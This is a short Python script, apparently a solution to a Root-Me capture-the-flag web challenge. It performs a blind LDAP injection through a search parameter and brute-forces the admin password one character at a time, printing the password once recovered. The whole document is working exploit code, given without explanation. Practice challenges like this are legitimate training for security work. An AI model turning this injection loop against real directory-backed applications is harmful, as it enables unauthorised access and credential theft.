import requests
import urllib
    
charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
page = "http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search="
passwd=""
    
continuer=True
for t in range(0,50):
    if continuer:
        continuer=False
        for carac in charset:
            #payload=(("search", "admin*)(password="+passwd+carac))
            payload=page+("admin*)(password="+urllib.quote_plus(passwd+carac))
            res = requests.get(payload)
            print ("Result : ",res.text)
    
            if "admin" in res.text:
                passwd+=carac
                continuer=True
                print passwd
                break
    else:
        print "Le mot de passe est : "+passwd
        break

